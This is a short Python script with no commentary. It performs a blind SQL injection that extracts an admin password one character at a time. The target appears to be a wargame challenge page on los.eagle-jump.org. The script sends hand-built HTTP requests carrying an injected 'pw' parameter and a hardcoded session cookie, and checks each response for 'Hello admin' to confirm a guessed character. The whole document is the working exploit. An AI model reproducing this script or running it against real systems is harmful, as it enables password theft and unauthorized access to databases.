import socket

array = ""
for n in range(1, 9):
    for x in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("104.27.175.42", 80))
        data = "GET /orge_40d2b61f694f72448be9c97d1cea2480.php?pw=%27+%7c%7c+(ascii(substr(pw,+" + str(n) + ",+1))%3d" + str(ord(x)) + "+%26%26+id%3d%27admin%27)+" + "%23" + " HTTP/1.1\r\n" + \
                "Host: los.eagle-jump.org\r\n" + \
                "Cookie: __cfduid=dda4d8e6a10d2d630e0b224675adf7ff21489487743; PHPSESSID=7f9k1otik4u5tlf650brofubq4\r\n" + \
                "Referer: https://los.eagle-jump.org/gate.php\r\n" + \
                "\r\n"

        send.send(data.encode())
        recv = send.recv(1500)

        send.close()

        if "Hello admin" in recv.decode():
            array += x
            print(array)
            break
